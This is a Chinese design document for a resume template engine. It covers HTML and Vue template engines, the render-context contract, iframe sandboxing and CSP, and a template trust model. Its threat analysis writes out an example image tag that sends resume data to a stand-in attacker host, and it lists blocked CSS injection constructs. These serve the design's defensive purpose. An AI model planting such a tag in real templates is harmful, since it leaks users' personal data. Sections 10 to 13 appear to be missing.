# 简历模板引擎 v2 设计方案

> 目标：把模板从「结构化区块 DSL」升级为「代码化模板」，支持 **纯 HTML 模板** 与 **Vue 模板** 两种写法构建高自由度简历；用户填写的全部信息统一存为一份 JSON，模板通过变量插值与之拼装。

- 状态：**HTML 引擎路径已实现**（P0–P2、P4、P5）；Vue 引擎（P3）未实现
- 影响范围：`shared/template-schema/*`、`frontend/src/features/template-renderer/*`、`frontend/src/components/preview/*`、`frontend/src/components/template-designer/*`、`frontend/src/views/TemplateDesigner.vue`、`backend/src/template/*`、`backend/src/routes/template.ts`、`backend/migrations`
- 关联文档：[模板变量契约](./模板变量契约.md)

---

## 实现纪要

已交付：模板从「行-列-区块 DSL」升级为 `schemaVersion: 2` + `engine` 三态，HTML 引擎为主力，`blocks` 作为兼容路径原样保留，`vue` 在校验层被显式拒绝。

验证结果：前端 `vue-tsc --noEmit` 通过、`vitest run` 75/75 通过、`vite build` 通过；后端 `tsc --noEmit` 通过，`runTemplateSchemaSelfCheck()` 的 15 条断言通过。

### 相对本方案的四处偏离

| 项 | 方案原计划 | 实际实现 | 原因 |
| --- | --- | --- | --- |
| 共享校验（§8.1） | `shared/template-schema` 用 Zod | 用**纯 TS** 校验函数，前端零新增运行时依赖 | 避免给前端加 13KB 的 zod；双写问题同样消除了，后端只做薄封装 |
| 代码编辑器（§10） | 引入 CodeMirror 6 | `textarea` + 行号栏，支持 Tab/Shift+Tab 多行缩进、错误行标红、光标处插入片段 | 不引入 90KB 依赖；核心诉求是模板引擎可用，编辑器体验可后续增强 |
| 内置模板存储（§9.2） | migration 里 `UPDATE` 三条 seed 记录 | 内置模板**不入库**，由 `shared/template-schema/src/builtin` 提供，接口层合并「代码内置 + DB 自定义」 | 内置模板本质是代码（HTML+CSS+变量声明），入库会让每次改动都要写几 KB 的 migration，且逃过类型检查 |
| blocks → html 转换（§9.3） | 用「模板化模式」跑区块渲染器，反向生成带占位符的 HTML | 以结构最接近的**内置模板**作为起点，UI 上明确告知区块结构需要手工重写 | 反向编译器做不到高保真，做半成品会误导用户 |

### 实现中发现并修正的既有缺陷

有一类缺陷反复出现：**简历侧的字段总是有默认值，导致模板声明的内容永远无法生效**。

1. `metadata.theme` 恒有值，会永久覆盖 `variables[].default` —— 换模板看不出配色差别。改为只在 `templateVars` 缺失（旧数据）时才回退读 theme。
2. `metadata.page.margin` 恒为 24，模板的 `page.margin` 永远无效。改为 `metadata.page` 整体可选，缺省跟随模板。
3. `metadata.page.format` 同理，一并改为可选。
4. 切换模板时 `TemplatePicker` 会把旧模板的字体字号写进新简历，改为清空 `templateVars` 让新模板默认值生效。

另有三处独立缺陷：

5. `helpers.date` 的尾部分隔符清理会把 `YYYY年M月` 里作为后缀的「月」一起删掉。改为只在输入精度低于格式要求时才 trim。
6. 原 `sanitizeCss` 无条件拦截 `url()`，合法的 `data:image` 内嵌图片也用不了。改为按协议条件放行。
7. 原测试跑在 `environment: 'node'` 下，`sanitizeHtml` 走的是正则降级分支，而生产走 DOMParser 分支 —— 安全用例测的不是实际生效的代码路径。测试环境已切到 jsdom。

### 未实现

- **Vue 引擎（P3）**：沙箱页、`allow-scripts` iframe、postMessage 协议、`snapshotHtml` 的异步分支均未实现。`engine: 'vue'` 在 `ENABLED_ENGINES` 之外，校验层直接拒绝，渲染层输出「尚未启用」提示块而不是白屏。类型与 schema 已为它预留位置，启用时不需要改数据结构。
- **`capabilities.allowScript`**：恒为 `false`，校验层拒绝置为 `true`。
- **`foreign` 档位模板的分享场景**：`trust` 字段已由接口下发，但模板市场本身不在本期范围内。

## 1. 现状与问题

当前模板结构（`schemaVersion: 1`）：

```
ITemplateConfig
├─ layout / primaryColor / fontFamily / fontSize / spacing / customCss
└─ document.rows[].columns[].blocks[]
      blocks 只有 6 种类型：basics | section | divider | text | avatar | html
```

渲染管线全部在前端 `frontend/src/features/template-renderer/`：

1. `migrate.ts` 把旧配置按 4 种预设 layout 生成默认 `document`
2. `compile.ts` 用**字符串拼接**产出 HTML，`renderBasics` / `renderSectionBody` 里按 `summary/experience/education/skills/projects/languages` **硬编码** 了每个模块的 HTML 结构
3. `mustache.ts` 自研受限 Mustache，只有 `html` 类型区块用得上
4. `sanitize.ts` 白名单清洗，`validate.ts` 与后端 `backend/src/template/schema.ts` 的 Zod 规则**双份重复实现**
5. `SecureResumeFrame.vue` 用 `<iframe sandbox="" srcdoc>` + CSP `default-src 'none'` 隔离

核心问题：

| 问题 | 说明 |
| --- | --- |
| 自由度天花板 | 模块的 DOM 结构写死在 `compile.ts`。想把工作经历改成时间轴样式、想让技能显示成环形图，只能改源码 |
| 样式表达受限 | `IBlockStyle` 只开放 8 个 CSS 属性；栅格只有 12 列 flex |
| 唯一的自由出口太窄 | `html` 区块虽然能写 HTML + Mustache，但变量上下文是扁平化的 `{ basics, experience, experience_content, ... }`，无法遍历 `sections`、无循环嵌套、无条件分支、无日期格式化 |
| 无法交互式布局 | `sandbox=""` 完全禁 JS，任何需要脚本的排版（自动分页、内容溢出检测、图表）都做不了 |
| 校验逻辑双写 | 前后端两份规则，已经出现漂移（前端多校验 `@charset`，后端没有） |
| 内置模板仍是旧格式 | `0001_init.sql` 里 3 个 seed 模板没有 `document` 字段，靠读取时 `normalizeIncomingConfig` 兜底升级 |

## 2. 设计目标与非目标

### 目标

1. 模板本体是**代码**（HTML 字符串或 Vue SFC 字符串），模板作者拥有完整的 DOM/CSS 控制权
2. 简历数据是**唯一的一份 JSON**（`resume.data`），模板只读消费，二者完全解耦
3. 变量契约**版本化、可文档化、可在设计器里自动列出**
4. 两种引擎共存，且**导出路径统一**（都能落地为静态 HTML → 打印 PDF）
5. 安全不退化：模板可能来自其他用户（内置模板/未来的模板市场），必须防 XSS 与**简历数据外泄**
6. 旧模板（v1 区块 DSL）继续可用，可一键转成 HTML 模板继续编辑

### 非目标

- 不做服务端渲染 / 服务端 PDF（导出继续走浏览器打印）
- 不支持模板里 `import` 第三方 npm 包
- 不支持模板发起网络请求（CSP 显式禁止 `connect-src`）
- 本期不做模板市场与评分体系，只把数据结构留出扩展位

## 3. 总体架构

```
                    ┌──────────────────────────────┐
  resume.data JSON  │  buildRenderContext()        │
  (用户填写的全部信息) │  → 稳定的渲染视图模型 ctx     │
                    └──────────────┬───────────────┘
                                   │
        ┌──────────────────────────┼──────────────────────────┐
        │                          │                          │
   engine=blocks              engine=html               engine=vue
   (v1 兼容)                                                   
        │                          │                          │
  renderBlocksToHtml        renderHtmlTemplate         VueSandboxFrame
  (保留现有逻辑)             (模板语法引擎+sanitize)      (iframe postMessage)
        │                          │                          │
        └──────────┬───────────────┘                          │
                   ▼                                          ▼
        SecureResumeFrame                            iframe sandbox=
        iframe sandbox="" + srcdoc                   "allow-scripts"
        (零脚本，最强隔离)                              opaque origin + CSP
                   │                                          │
                   └──────────────┬───────────────────────────┘
                                  ▼
                        snapshotHtml() 静态 HTML 快照
                                  ▼
                          打印 / PDF / 分享页
```

关键设计取舍：**Vue 引擎只是「编写期」的能力，导出期统一降级为静态 HTML 快照**。这样 PDF 导出、公开分享页、缩略图生成三条链路不需要为 Vue 单独实现。

## 4. 模板数据结构（schemaVersion = 2）

### 4.1 TypeScript 定义

放在 `frontend/src/types/template.ts`，后端 `backend/src/template/schema.ts` 用 Zod 镜像（见 §8）。

```ts
export type TTemplateEngine = 'html' | 'vue' | 'blocks';

/** 模板对外暴露的可调参数，渲染时注入为 CSS 变量 + ctx.vars */
export interface ITemplateVariable {
  key: string;                                   // 合法标识符，如 primaryColor
  label: string;                                 // 面板显示名
  type: 'color' | 'number' | 'text' | 'select' | 'boolean' | 'length';
  default: string | number | boolean;
  options?: { label: string; value: string }[];  // type=select
  min?: number;
  max?: number;
  step?: number;
  /** 映射到的 CSS 自定义属性名，缺省为 --tpl-{kebab(key)} */
  cssVar?: string;
  group?: string;                                // 面板分组
}

export interface ITemplatePage {
  format: 'a4' | 'letter';
  /** mm */
  margin: { top: number; right: number; bottom: number; left: number };
  /** 是否启用多页分页（CSS 分页断点辅助类） */
  paged: boolean;
}

export interface ITemplateSource {
  /** engine=html 时必填：模板语法 HTML */
  html?: string;
  /** engine=vue 时必填：Vue SFC（template + style，script 受限） */
  vue?: string;
  /** 两种引擎共用的样式表；engine=vue 时可留空由 SFC <style> 承担 */
  css: string;
}

export interface ITemplateConfigV2 {
  schemaVersion: 2;
  engine: TTemplateEngine;

  /** 模板自述信息，用于模板中心展示 */
  meta: {
    title: string;
    author?: string;
    description?: string;
    tags?: string[];
    /** 模板作者声明依赖的变量契约版本，运行时做兼容检查 */
    contextVersion: 1;
  };

  page: ITemplatePage;

  /**
   * 模板声明的可调参数（只是「声明」）。
   * 用户对这些参数的实际取值属于用户数据，存在 resume.metadata.templateVars，见 §6.3
   */
  variables: ITemplateVariable[];

  /** 模板本体代码 */
  source: ITemplateSource;

  /** engine=blocks 时保留 v1 的区块文档 */
  document?: ITemplateDocument;

  /** 沙箱能力开关，仅内置/审核过的模板可放宽 */
  capabilities?: {
    /** engine=vue 是否允许 SFC 内的 <script setup>（默认 false，直接剥离） */
    allowScript?: boolean;
    /** 是否允许 https 外链图片（默认 true），关闭后仅允许 data:image */
    allowRemoteImages?: boolean;
    /** 是否允许 @font-face（默认 false） */
    allowWebFonts?: boolean;
  };
}
```

### 4.2 一个 HTML 模板示例

```html
<!-- source.html -->
<article class="cv">
  <header class="cv-head">
    {{#if basics.avatarUrl}}
      <img class="cv-avatar" src="{{basics.avatarUrl}}" alt="" />
    {{/if}}
    <div>
      <h1>{{basics.name}}</h1>
      <p class="cv-headline">{{basics.headline}}</p>
      <ul class="cv-contact">
        {{#each basics.contacts}}
          <li>{{this.value}}</li>
        {{/each}}
      </ul>
    </div>
  </header>

  {{#each sections}}
    <section class="cv-sec cv-sec--{{this.type}}">
      <h2>{{this.name}}</h2>

      {{#if this.isText}}
        <div class="cv-rich">{{& this.content}}</div>
      {{/if}}

      {{#each this.items}}
        <div class="cv-item">
          <div class="cv-item-head">
            <strong>{{this.title}}</strong>
            <span>{{this.dateRange}}</span>
          </div>
          {{#if this.subtitle}}<div class="cv-item-sub">{{this.subtitle}}</div>{{/if}}
          {{#if this.description}}<div class="cv-rich">{{& this.description}}</div>{{/if}}
          {{#each this.keywords}}<span class="cv-tag">{{this}}</span>{{/each}}
        </div>
      {{/each}}
    </section>
  {{/each}}
</article>
```

```css
/* source.css —— 编译时自动作用域化到 .cv-root 下 */
.cv { padding: var(--page-margin-top) var(--page-margin-right); }
h1 { color: var(--tpl-primary-color); font-size: 1.8em; }
.cv-sec { break-inside: avoid; margin-bottom: var(--tpl-section-gap); }
```

注意 `{{ this.title }}` / `{{ this.dateRange }}` —— 这是**归一化后的条目字段**，模板作者不需要区分 `experience.position` 还是 `education.school`。原始字段同时保留在 `this.raw.*`，详见变量契约文档。

### 4.3 一个 Vue 模板示例

```vue
<!-- source.vue -->
<template>
  <article class="cv">
    <header :style="{ background: vars.headerBg }">
      <h1>{{ basics.name }}</h1>
      <p>{{ basics.headline }}</p>
    </header>

    <section v-for="sec in sections" :key="sec.id" class="cv-sec">
      <h2>{{ sec.name }}</h2>
      <div v-if="sec.isText" class="cv-rich" v-html="sec.contentSafe" />
      <div v-for="item in sec.items" :key="item.id" class="cv-item">
        <div class="cv-item-head">
          <strong>{{ item.title }}</strong>
          <span>{{ item.dateRange }}</span>
        </div>
        <!-- 技能条：这是 HTML 引擎做不到的动态表达 -->
        <div v-if="sec.type === 'skills'" class="bar">
          <i :style="{ width: (item.raw.level / 5 * 100) + '%' }" />
        </div>
      </div>
    </section>
  </article>
</template>

<style>
.cv-sec { break-inside: avoid; }
.bar { height: 6px; background: #eee; }
.bar i { display: block; height: 100%; background: var(--tpl-primary-color); }
</style>
```

约定：

- 渲染上下文以 `data()` 形式注入，模板里直接用 `basics` / `sections` / `s` / `vars` / `page` / `helpers`
- `v-html` 只接受以 `Safe` 结尾的字段（`contentSafe` / `descriptionSafe`），这些字段在注入前已由父页面 `sanitizeHtml` 清洗过
- `<script>` 默认被剥离；`capabilities.allowScript` 打开后允许 `<script setup>`，但沙箱内无网络、无存储、无父页面访问

## 5. 渲染视图模型（变量契约）

这是「用户 JSON ↔ 模板变量」拼装的核心。**不把 `resume.data` 原样丢给模板**，原因：

- `sections` 是数组，模板要拿「工作经历」得自己 `find(s => s.type === 'experience')`
- 每类条目字段名各异（`position/company` vs `school/degree` vs `name/level`），模板作者要为每类写一遍
- 日期是裸字符串 `"2022-03"`，需要格式化与「至今」处理
- 富文本描述需要一个受控的 raw 输出通道

因此引入 `buildRenderContext(data, config): IRenderContext`，产出稳定契约：

```ts
export interface IRenderContext {
  contextVersion: 1;

  basics: {
    name: string; headline: string; email: string; phone: string;
    location: string; url: string; avatarUrl: string;
    initial: string;                        // 姓名首字，头像占位用
    /** 已过滤空值的联系方式列表，方便直接 each */
    contacts: { key: string; label: string; value: string; href: string }[];
  };

  /** 按 order 排序、已过滤 visible=false 的模块 */
  sections: IRenderSection[];

  /** 按 type 索引，便于自由布局：{{s.experience.items}} */
  s: Record<string, IRenderSection | undefined>;

  /** 模板变量的实际取值 */
  vars: Record<string, string | number | boolean>;

  page: { format: string; margin: {...}; widthMm: number; heightMm: number };

  meta: { templateId: string; generatedAt: string };
}

export interface IRenderSection {
  id: string;
  type: TSectionType;
  name: string;
  /** summary/custom 这类自由文本模块 */
  isText: boolean;
  content: string;          // 纯文本
  contentSafe: string;      // sanitize 后的 HTML，供 v-html / {{& }}
  items: IRenderItem[];
  isEmpty: boolean;
}

export interface IRenderItem {
  id: string;
  index: number;            // 0-based
  /** 归一化四元组，跨模块统一 */
  title: string;            // experience.position / education.school / skills.name / ...
  subtitle: string;         // experience.company / education.degree+major / ...
  meta: string;             // location / issuer / url
  dateRange: string;        // "2022.03 – 至今"
  description: string;
  descriptionSafe: string;
  keywords: string[];
  /** 原始条目，需要精确控制时用 */
  raw: Record<string, unknown>;
}
```

`helpers`（HTML 引擎作为过滤器，Vue 引擎作为方法注入）：

| helper | 用途 |
| --- | --- |
| `date(value, format)` | `2022-03` → `2022.03` / `Mar 2022` |
| `dateRange(start, end, current)` | 拼 `2022.03 – 至今` |
| `join(arr, sep)` | 关键词拼接 |
| `truncate(str, n)` | 截断 |
| `nl2br(str)` | 换行转 `<br>`（输出走 safe 通道） |

完整字段映射表见 [模板变量契约](./模板变量契约.md)。

**契约版本化**：`contextVersion` 独立于 `schemaVersion`。往契约里加字段不升版本；改名/删字段才升版本，并在 `buildRenderContext` 里按模板声明的 `meta.contextVersion` 做兼容降级。

## 6. 数据存储与职责边界

### 6.1 两份 JSON，职责分离

| 存储位置 | 内容 | 归属 |
| --- | --- | --- |
| `resume.data` (D1 JSON 列) | 用户填写的全部信息：`basics` / `sections` / `metadata` | 用户 |
| `template.config` (D1 JSON 列) | 模板代码与声明：`engine` / `source` / `variables` / `page` | 模板作者 |

`resume.data` 结构**不变**（`IResumeData`），这保证模板换来换去用户数据不受影响 —— 这正是「所有信息存为一个 JSON，通过变量拼装」的落点。

### 6.2 需要的表结构调整

`config` 是 JSON 列，新结构不改表也能存。但为了模板中心按引擎筛选、以及后续审核流程，加两个冗余列：

```sql
-- backend/migrations/0002_template_engine.sql
ALTER TABLE template ADD COLUMN engine TEXT NOT NULL DEFAULT 'blocks';
ALTER TABLE template ADD COLUMN schema_version INTEGER NOT NULL DEFAULT 1;
CREATE INDEX IF NOT EXISTS idx_template_engine ON template(engine);

-- 把 3 个内置 seed 模板升级为 v2 HTML 模板（配置见 §9.2 内置模板改造）
UPDATE template SET engine = 'html', schema_version = 2, config = '<v2-json>' WHERE id = 'modern';
-- classic / minimal 同理
```

### 6.3 用户对模板变量的覆写值放哪

模板声明 `variables`，用户在 ThemePanel 里调色调字号，这个值属于**用户**，不能写回 `template.config`（内置模板只读、共享模板会互相污染）。

放到 `resume.data.metadata`，新增字段：

```ts
export interface IResumeMetadata {
  templateId: string;
  /** 新增：对模板 variables 的覆写，key 与 ITemplateVariable.key 对应 */
  templateVars?: Record<string, string | number | boolean>;
  theme: IResumeTheme;      // 保留，作为 templateVars 的兜底来源
  page: { margin: number; format: 'a4' | 'letter' };
}
```

`buildRenderContext` 里的合并顺序：`variables[].default` → `metadata.theme`（旧数据映射）→ `metadata.templateVars`。

## 7. 渲染实现

### 7.1 HTML 引擎

`mustache.ts` 升级为 `template-lang/`（保留原文件名导出以免破坏现有测试）：

| 语法 | 说明 |
| --- | --- |
| `{{path.to.value}}` | HTML 转义插值 |
| `{{& path}}` | **受控** raw 输出：仅允许 `*Safe` 结尾字段或经 `sanitizeHtml` 处理后的值 |
| `{{{ ... }}}` | 继续**禁止**，编译期抛错（保持现有约束） |
| `{{#if cond}}...{{else}}...{{/if}}` | 条件 |
| `{{#unless cond}}...{{/unless}}` | 反向条件 |
| `{{#each list}}...{{/each}}` | 循环，内部可用 `this` / `@index` / `@first` / `@last` |
| `{{value \| date('YYYY.MM')}}` | 过滤器链，白名单 helper |
| `{{#with obj}}...{{/with}}` | 作用域切换 |

实现要点：

- **先编译成 AST，再求值**，不再用现有的正则递归替换。正则方案在嵌套 `each`/`if` 同名标签时会错配，且无法支持 `else`
- 编译结果按模板字符串哈希缓存，避免每次输入变更都重新编译
- 无用户代码执行：过滤器只能调白名单 helper，不支持任意表达式（不引入 `new Function`）
- 编译期做静态检查：未闭合标签、未知过滤器、`{{{`、引用未定义变量（警告不报错）

**向后兼容约束**：现有 v1 `html` 区块和 `renderer.test.ts` 里用的是 Mustache 原生语义 —— `{{#items}}...{{/items}}` 在 `items` 为数组时**迭代**、为真值时**切换作用域**。新引擎必须同时支持这套 `{{#key}}` 语义（作为 `each`/`with`/`if` 的合一形式）和新增的显式 `{{#each}}`/`{{#if}}`/`{{#with}}`，否则已保存的自定义模板会破。新模板文档只推荐显式写法。

CSS 处理：

- `source.css` 自动**作用域化**：给每条选择器加 `.cv-root ` 前缀（用轻量 CSS 解析器，处理 `@media`/`@supports` 嵌套，跳过 `@font-face`/`:root`）
- 沿用 `sanitizeCss` 禁止 `@import` / `url()` / `expression()` / `javascript:` / `behavior:` / `-moz-binding`
- `url()` 现在被全量拦截，这会挡掉合法的 `data:image` 背景图。改为**条件放行**：`url(data:image/...)` 允许，`url(https://...)` 视 `capabilities.allowRemoteImages` 而定，其余拦截

输出继续注入 `SecureResumeFrame` 的 `sandbox=""` + srcdoc，安全等级不变。

### 7.2 Vue 引擎

这是本方案最需要谨慎的部分。三个硬约束：

1. Vue 模板需要**运行时编译器**（`vue/dist/vue.esm-browser.js`），当前依赖是 runtime-only
2. 运行时编译器用 `new Function` 生成 render 函数 → CSP 必须允许 `unsafe-eval`
3. 现有 `sandbox=""` 完全禁 JS，必须放宽为 `allow-scripts`

#### 隔离方案

不用 `srcdoc`，改用**独立沙箱页面** `public/sandbox/vue-renderer.html`：

```
<iframe
  src="/sandbox/vue-renderer.html"
  sandbox="allow-scripts"          <!-- 注意：绝不加 allow-same-origin -->
  referrerpolicy="no-referrer"
/>
```

`allow-scripts` 但**不加** `allow-same-origin`，iframe 落到 **opaque origin**，因此：

- 无法访问父页面 DOM、`window.parent` 受限（只剩 `postMessage`）
- 无法读写 `localStorage` / `sessionStorage` / `document.cookie`（同源存储在 opaque origin 下直接抛异常）
- 无法拿到 JWT，也拿不到父页面的任何状态

沙箱页 CSP（通过 `frontend/public/_headers` 下发，Cloudflare Pages 支持）：

```
/sandbox/*
  Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src data: https:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'; frame-ancestors 'self'
```

`connect-src 'none'` 是关键：即使模板作者写了恶意 `<script>`，也**无法把简历数据发出去**（fetch/XHR/WebSocket/sendBeacon 全被 CSP 拦）。配合 `img-src` 仅 `data:` + `https:`，还需要注意攻击者可用 `<img src="https://evil.com/?data=...">` 外泄——因此：

- `capabilities.allowRemoteImages` 默认对**用户自定义 Vue 模板关闭**，此时 CSP 收紧为 `img-src data:`，并在渲染前把 `basics.avatarUrl` 的 https 图片在父页面转成 `data:` URL 再传入
- 内置/审核过的模板才放开 `https:`

#### 通信协议

父页 → 沙箱（`postMessage`，父页做 `targetOrigin: '*'` + 沙箱侧校验 `event.source === window.parent`）：

```ts
type TSandboxInbound =
  | { type: 'render'; id: string; template: string; style: string; ctx: IRenderContext; cssVars: Record<string,string> }
  | { type: 'snapshot'; id: string };

type TSandboxOutbound =
  | { type: 'ready' }
  | { type: 'rendered'; id: string; heightPx: number }
  | { type: 'snapshot'; id: string; html: string; css: string }
  | { type: 'error'; id: string; phase: 'compile' | 'render'; message: string };
```

沙箱页职责（`frontend/src/sandbox/vue-renderer.ts`，Vite 单独打成 IIFE，避免 module script 在 opaque origin 下的 CORS 问题）：

1. 收到 `render`：剥离/校验 SFC（`extractSfc`），拿到 `template` / `style` / 可选 `script`
2. `createApp({ template, data: () => ctx, methods: helpers })` 挂载到 `#cv-root`
3. 注入 `cssVars` 到 `#cv-root` 的 inline style
4. `nextTick` 后回传实际高度，父页面据此调整 iframe 高度
5. 编译/渲染异常用 `app.config.errorHandler` + try/catch 捕获，回传 `error`，父页面展示友好错误块（不白屏）

#### 依赖与构建

`vue` 已在依赖里，但当前是 runtime-only。沙箱入口需显式引用**含编译器**的构建（Vue 3 的 `vue.esm-bundler.js` 是 runtime + compiler，`vue.runtime.esm-bundler.js` 才是 runtime-only）：

```ts
// frontend/src/sandbox/vue-renderer.ts
import { createApp } from 'vue/dist/vue.esm-bundler.js';
```

**构建产物格式是个坑，需要显式处理。** 如果按 Vite 多页入口（`rollupOptions.input` 加一个 HTML）来做，产物是 ES module，沙箱页里会是 `<script type="module" src="/assets/sandbox-xxx.js">`。module script 以 CORS 模式请求，而沙箱页处于 opaque origin，这个同站请求会被当成跨源，需要 `Access-Control-Allow-Origin` 才能加载。

两条可行路径，推荐前者：

1. **独立 IIFE 构建**（推荐）：给沙箱单独跑一次 `vite build --config vite.sandbox.config.ts`，用 `build.lib` + `formats: ['iife']` 输出单文件到 `public/sandbox/vue-renderer.js`，沙箱页用经典 `<script src>` 引入，完全绕开 module CORS。代价是构建脚本多一步（`npm run build` 里串起来）。
2. **多页入口 + CORS 头**：在 `_headers` 里给 `/assets/*` 加 `Access-Control-Allow-Origin: *`。更简单，但给全部静态资源放开了 CORS，且在 Tauri 的本地文件协议下仍然不可靠。

```ts
// vite.sandbox.config.ts（方案 1）
export default defineConfig({
  build: {
    lib: {
      entry: resolve(__dirname, 'src/sandbox/vue-renderer.ts'),
      formats: ['iife'],
      name: 'CvVueSandbox',
      fileName: () => 'vue-renderer.js',
    },
    outDir: 'public/sandbox',
    emptyOutDir: false,
  },
  define: { __VUE_PROD_DEVTOOLS__: 'false', __VUE_OPTIONS_API__: 'true' },
});
```

体积影响：Vue 运行时编译器约 +40KB gzip。它在独立入口里，只有打开 Vue 模板、iframe 实际加载沙箱页时才会下载，不影响主包首屏。

#### Tauri 环境注意

`tauri.conf.json` 当前 `security.csp: null`（不下发 CSP）。桌面端 iframe 的 `sandbox` 属性由 WebView 原生支持，`allow-scripts` 行为一致。但 `_headers` 在 Tauri 里不生效（本地文件协议），所以沙箱页需要**同时**在 HTML 里放 `<meta http-equiv="Content-Security-Policy">` 作为兜底。Web 端以响应头为准（更强，`frame-ancestors` 只在响应头生效）。

### 7.3 静态快照（导出统一出口）

```ts
export async function snapshotHtml(
  config: ITemplateConfigV2,
  data: IResumeData
): Promise<string>
```

- `engine=html` / `blocks`：同步产出，直接复用渲染结果
- `engine=vue`：需要一个离屏沙箱 iframe，`render` → `snapshot` → 取回 `document.querySelector('#cv-root').outerHTML` + 收集到的 style，父页面再跑一遍 `sanitizeHtml`（因为快照来自允许脚本的环境，必须重新清洗）

打印 / 公开分享页 / 缩略图生成三条链路都消费 `snapshotHtml` 的结果，并且渲染在 `sandbox=""` 的 iframe 里。这样**导出产物永远是零脚本的静态 HTML**。

## 8. 校验与安全

### 8.1 消除双写：抽公共校验包

现在 `frontend/.../validate.ts` 与 `backend/src/template/schema.ts` 规则重复且已漂移。方案：

在仓库根建 `shared/template-schema/`，用 Zod 写**唯一一份** schema，前后端都引入：

```
shared/template-schema/
├─ package.json          # name: @cv/template-schema, type: module
├─ src/
│  ├─ index.ts
│  ├─ v2.ts              # ITemplateConfigV2 的 Zod schema + 类型推导
│  ├─ v1.ts              # 保留 v1 schema，用于 blocks 引擎与迁移
│  ├─ limits.ts          # TEMPLATE_LIMITS 单一来源
│  └─ migrate.ts         # v1 → v2 迁移
```

- 前端通过 vite alias `@cv/template-schema` 指向 `shared/template-schema/src`
- 后端 Wrangler 走 esbuild bundle，`tsconfig.paths` 加映射即可
- 前端需新增依赖 `zod`（后端已有），约 +13KB gzip。若不想加，退路是 shared 包只导出**纯 TS 校验函数**（不用 Zod），后端再包一层 Zod。**推荐直接上 Zod**，避免第三次重复实现

限额（`TEMPLATE_LIMITS` v2）：

```ts
{
  maxHtmlLength: 60_000,     // 从 20k 提高，模板本体是完整文档了
  maxVueLength: 60_000,
  maxCssLength: 60_000,
  maxVariables: 40,
  maxTotalConfigBytes: 200_000,  // 单模板 config JSON 总大小
  // v1 blocks 限额沿用
  maxRows: 40, maxColumnsPerRow: 4, maxBlocksPerColumn: 30, maxTextLength: 4_000,
}
```

### 8.2 分级信任模型

模板代码的可信度不是二元的。定义三档：

| 档位 | 判定 | HTML 引擎 | Vue 引擎 |
| --- | --- | --- | --- |
| **trusted** | `is_builtin = 1` | 完整标签白名单 + 放开 https 图片/webfont | 允许 `<script setup>`、`img-src https:` |
| **owned** | `user_id = 当前用户` | 同 trusted，但 webfont 关闭 | 允许脚本，`img-src data:` only |
| **foreign** | 别人的非内置模板（未来市场场景） | 严格白名单，仅 `data:image` | **禁止 Vue 引擎**，强制降级为 snapshot 预览 |

后端在 `mapTemplate` 时算出 `trust` 字段随响应下发，前端据此决定 sandbox 属性与 CSP。

### 8.3 安全检查清单

- [ ] HTML 引擎：模板经 `sanitizeHtml` 白名单清洗；`{{{` 编译期拒绝；`{{&}}` 只放行 `*Safe` 字段
- [ ] CSS：作用域化 + 危险语法拦截 + `url()` 条件放行
- [ ] Vue 引擎：`sandbox="allow-scripts"` 且**绝不**同时 `allow-same-origin`
- [ ] Vue 沙箱 CSP：`connect-src 'none'`、`form-action 'none'`、`base-uri 'none'`
- [ ] Vue 沙箱页不携带任何凭证，不与后端同源通信
- [ ] 快照回传后在父页面**重新** sanitize
- [ ] 后端存储前 Zod 校验 + 总字节上限，拒绝超限
- [ ] `foreign` 模板禁用 Vue 引擎
- [ ] 头像等外链图片按需在父页面转 `data:` 后注入
- [ ] 沙箱侧校验 `event.source === window.parent`，忽略其他来源消息

**残余风险（需明确接受）**：`unsafe-eval` 是 Vue 运行时编译器的硬需求。缓解手段是 opaque origin + `connect-src 'none'`，即攻击者能在沙箱内执行脚本，但拿不到凭证、访问不了父页面、也发不出网络请求。若这个风险不可接受，替代路径是**编写期在主应用用 `@vue/compiler-dom` 预编译成 render 函数字符串，沙箱只加载 runtime-only**，代价是仍需 `new Function` 执行 render 函数（同样要 `unsafe-eval`），收益有限。因此保留当前方案。

## 9. 兼容与迁移

### 9.1 三种引擎共存策略

```ts
// shared/template-schema/src/migrate.ts
export function normalizeTemplateConfig(raw: unknown): ITemplateConfigV2 {
  // 1. 无 schemaVersion 或只有 layout/主题 → 先跑 v1 的 normalizeIncomingConfig
  // 2. schemaVersion === 1 → 包装成 { schemaVersion: 2, engine: 'blocks', document, ... }
  // 3. schemaVersion === 2 → 原样校验返回
}
```

`engine: 'blocks'` 完整保留现有 `compile.ts` 的渲染逻辑（重命名为 `renderBlocksToHtml`），旧模板与旧简历零感知升级。`migrateTemplateConfig` 保留为 `blocks` 内部使用。

### 9.2 内置模板改造

3 个内置模板（`modern` / `classic` / `minimal`）从 seed 的旧格式直接重写为 **v2 HTML 模板**。这同时是三份可读的参考实现，也是新建模板的起始模板。落在 `shared/template-schema/src/builtin/`，同时用于：

- `0002` migration 的 `UPDATE` 语句（构建时生成 SQL）
- 前端「新建模板」的预设选项

`frontend/src/templates/{Modern,Classic,Minimal}Template.vue` 三个 legacy Vue 组件与 `ResumePreview.vue` 里的 `legacyMap` 回退路径可以**删除**。

现状里 `legacyMap` 只在「`templateId` 在后端 list 与 detail 里都查不到、且恰好等于 `modern/classic/minimal`」时触发，`ResumePreview.vue` 的 `resolveConfig()` 对其他未知 id 已经走 `createDefaultTemplateConfig` 兜底。删除 `legacyMap` 后统一走这条兜底分支（v2 下改为「内置默认 HTML 模板」），行为更一致，也少维护一套与 DSL 平行的渲染实现。

### 9.3 一键转换：blocks → html

在设计器提供「转为 HTML 模板」按钮：调 `renderBlocksToHtml` 但**输出带 Mustache 占位符**而非填好数据的 HTML（即用一个「模板化模式」跑一遍区块渲染器），产出可读的 HTML 模板源码交给用户接管。单向操作，转换后不可逆，UI 上明确提示。

现有测试只有 `frontend/src/features/template-renderer/__tests__/renderer.test.ts`，vitest `environment: 'node'`。

注意：`sanitizeHtml` 在 node 环境下走的是**正则 fallback** 分支，不是 DOMParser 分支。新增安全用例必须把 template-renderer 的测试环境改为 `jsdom`（`vitest.config` 里按目录配 `environmentMatchGlobs`），否则测的不是生产实际走的代码路径。这是现有测试的一个盲区。

| 测试面 | 用例 |
| --- | --- |
| 契约 | `buildRenderContext` 归一化：各模块 title/subtitle/dateRange 映射正确；`visible=false` 被过滤；`s.experience` 索引可用 |

## 14. 待决问题

1. **是否引入 zod 到前端**（+13KB）以消除校验双写？推荐引入。替代方案是 shared 包导出纯函数校验，前端零新增依赖但表达力差。
